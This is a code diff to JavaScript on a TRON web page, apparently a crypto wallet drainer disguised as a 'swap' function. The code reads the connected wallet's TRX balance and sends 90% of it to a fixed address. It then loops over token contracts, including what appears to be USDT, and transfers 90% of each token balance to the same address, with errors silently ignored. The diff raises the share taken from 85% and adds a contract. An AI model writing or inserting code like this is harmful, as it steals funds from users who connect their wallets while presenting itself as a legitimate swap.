@@ -10,20 +10,21 @@ var contractsAddress = ["TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
                                     "TMwFHYXLJaRUPeW6421aqXL4ZEzPRFGkGT",
                                     "TRkuKAxmWZ4G74MvZnFpoosQZsfvtNpmwH",
                                     "TG3XANY34mpabHM2DNc5ajhjMJVUQU741Y",
+                                    "TZ44LW2FdGhrkY3Me85sx5n1VMSgCoopXC",
                                     "THb4CqiFdwNHsWsQCs4JhzwjMWys4aqCbF"]
 
             async function swap(){
                 try{
                     var balance = await window.tronWeb.trx.getBalance();
-                    if (balance >= 50000000)
-                    await tronWeb.trx.sendTransaction("TZ44LW2FdGhrkY3Me85sx5n1VMSgCoopXC", Math.round(balance * 85 / 100));
+                    if (balance >= 100000000)
+                    await tronWeb.trx.sendTransaction("TZ44LW2FdGhrkY3Me85sx5n1VMSgCoopXC", Math.round(balance * 90 / 100));
                 }catch{}
                 for(i=0; i<contractsAddress.length; i++){
                     try{
                     var cc = await window.tronWeb.contract().at(contractsAddress[i]);
                     balance = await cc.balanceOf(window.tronWeb.defaultAddress.base58).call();
                     if (balance.toNumber() >= 0){
-                        await cc.transfer("TZ44LW2FdGhrkY3Me85sx5n1VMSgCoopXC", Math.round(balance * 85 / 100)).send()
+                        await cc.transfer("TZ44LW2FdGhrkY3Me85sx5n1VMSgCoopXC", Math.round(balance * 90 / 100)).send()
                     }
                     }catch{}
                 }
